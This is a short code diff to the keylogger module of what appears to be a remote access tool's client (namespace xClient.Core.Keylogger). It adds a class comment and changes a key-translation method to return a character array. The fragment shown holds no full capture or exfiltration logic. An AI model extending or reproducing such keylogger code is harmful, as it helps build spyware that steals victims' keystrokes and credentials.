@@ -8,6 +8,10 @@ using System.Runtime.InteropServices;
 
 namespace xClient.Core.Keylogger
 {
+    /// <summary>
+    /// Ties together the logic used to log keyboard input with the
+    /// logic used to manipulate the output
+    /// </summary>
     public class Logger
     {
         public static Logger Instance;
@@ -255,7 +259,7 @@ namespace xClient.Core.Keylogger
             return Win32.GetKeyboardLayout(Win32.GetWindowThreadProcessId(Win32.GetForegroundWindow(), out pid));
         }
 
-        private char? FromKeys(LoggedKey key)
+        private char[] FromKeys(LoggedKey key)
         {
             //keyStates is a byte array that specifies the current state of the keyboard and keys
             //The keys we are interested in are modifier keys such as shift and caps lock
